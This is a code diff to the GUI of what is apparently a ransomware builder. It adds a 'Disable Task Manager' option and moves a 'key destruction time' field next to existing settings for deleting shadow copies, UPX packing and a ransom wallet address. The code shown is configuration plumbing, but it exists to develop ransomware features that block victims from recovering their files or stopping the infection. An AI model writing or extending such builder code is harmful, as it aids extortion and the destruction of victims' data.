@@ -118,17 +118,23 @@ class Gui(MainFrame):
             self.GuiTitleTextCtrl.SetValue(config_dict["gui_title"])
         else:
             self.GuiTitleTextCtrl.SetValue("")
+        # Key Destruction time
+        if "key_destruction_time" in config_dict:
+            self.KeyDestructionTimeTextCtrl.SetValue(config_dict["key_destruction_time"])
+        else:
+            self.KeyDestructionTimeTextCtrl.SetValue("")
         # Delete Shadow Copies
         if "delete_shadow_copies" in config_dict:
             if config_dict["delete_shadow_copies"]:
                 self.DeleteShadowCopiesCheckbox.SetValue(True)
             else:
                 self.DeleteShadowCopiesCheckbox.SetValue(BUILDER_CONFIG_ITEMS["delete_shadow_copies"]["default"])
-        # Key Destruction time
-        if "key_destruction_time" in config_dict:
-            self.KeyDestructionTimeTextCtrl.SetValue(config_dict["key_destruction_time"])
-        else:
-            self.KeyDestructionTimeTextCtrl.SetValue("")
+        # Disable Task Manager
+        if "disable_task_manager" in config_dict:
+            if config_dict["disable_task_manager"]:
+                self.DisableTaskManagerCheckbox.SetValue(True)
+            else:
+                self.DisableTaskManagerCheckbox.SetValue(BUILDER_CONFIG_ITEMS["disable_task_manager"]["default"])
         # Wallet Address
         if "wallet_address" in config_dict:
             self.WalletAddressTextCtrl.SetValue(config_dict["wallet_address"])
@@ -445,6 +451,8 @@ class Gui(MainFrame):
         user_input_dict["upx_dir"] = self.UpxDirPicker.GetPath()
         # Delete Shadow Copies
         user_input_dict["delete_shadow_copies"] = self.DeleteShadowCopiesCheckbox.IsChecked()
+        # Disable Task Manager
+        user_input_dict["disable_task_manager"] = self.DisableTaskManagerCheckbox.IsChecked()
         # Key Destruction Time
         user_input_dict["key_destruction_time"] = self.KeyDestructionTimeTextCtrl.GetValue()
         # Wallet Address
